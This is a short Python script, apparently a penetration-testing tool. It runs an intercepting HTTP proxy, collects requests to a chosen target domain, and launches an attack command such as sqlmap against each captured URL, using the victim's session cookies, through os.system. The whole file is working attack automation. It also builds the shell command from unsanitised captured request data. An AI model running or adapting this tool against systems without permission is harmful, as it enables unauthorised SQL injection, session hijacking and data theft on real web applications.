# p0wnpr0xy.py by Mark Baggett 
# Download from www.pauldotcom.com
# create a self signed certificate and modify /path/to/cert/file string to avoid HTTPS socket errors
# download httpservers.py from http://code.google.com/p/gnucitizen/source/browse/trunk/httpservers.py and place it in the same directory

import httpservers
import SocketServer
from Queue import Queue
from threading import Thread
import time,re,sys,os
import pdb

class Handler(httpservers.SimpleObservableProxyHTTPRequestHandler):
    def observe_request(self, data):
        #pdb.set_trace()
        global inscopeurls, target_domain
        #print "REQ>>"+repr(data)[:50]
        matchstring="Host:\s[\w_.]+%s" % target_domain
        matchscope = re.findall(matchstring, data, re.I)
        if matchscope:
          inscopeurls.put(repr(data))
        return data

    def observe_response(self, data):
        #print "RSP<<"+repr(data)[:50]
        return data

    def log_request(self, code): 
          pass

class Server(SocketServer.ThreadingMixIn, httpservers.SimpleObservableProxyHTTPServer):
          pass


def proxyserver():
  print 'Starting server on localhost:8080...'
  srv = Server(('localhost', 8080), Handler, '/path/to/cert/file')
  srv.serve_forever()

def printhelp():
  print """Here is your help.
sample p0wnpr0xy.py -t targetdomain.com -c "./sqlmap -u {url} --cookie: {cookies}"
"""

# Set up some global variables
num_attack_threads = 2
inscopeurls = Queue()

if not "-t" in sys.argv or not "-c" in sys.argv:
  printhelp()
  sys.exit(2)
for i in range(1,len(sys.argv),1):
  if sys.argv[i] == '-t':
    target_domain=str(sys.argv[i+1])
  elif sys.argv[i] == '-c':
    cmd = " ".join(sys.argv[i+1:])
  elif sys.argv[i] == '-v':
    verbose=1

proxythread = Thread(target=proxyserver)
proxythread.setDaemon(True)
proxythread.start()

while 1:
  if inscopeurls.qsize()==0:
	#print "Nothing in Queue, Waiting."
	time.sleep(5)
	continue
  queueitem = inscopeurls.get()
  matches = re.findall("GET (/[\w._/\\-?=&]+).*Host:\s([\w_.]+)", queueitem, re.I)
  if matches:
    matchuri,matchdomain = matches[0]
    checkit = raw_input(":"+str(inscopeurls.qsize())+":P0wn http://"+matchdomain+matchuri+"? [Y/N/Q]")
    if checkit == "q" or checkit == "Q":
       sys.exit(2)
    if checkit =="y" or checkit=="Y":
         cookies = "".join(re.findall("cookie:\s([\w+;= ]+)", queueitem, re.I))
         cmd1 = cmd.replace("{cookies}",cookies)
         cmd2 = cmd1.replace("{url}","http://"+matchdomain+matchuri) 
         print "Launching "+cmd2
         os.system(cmd2)

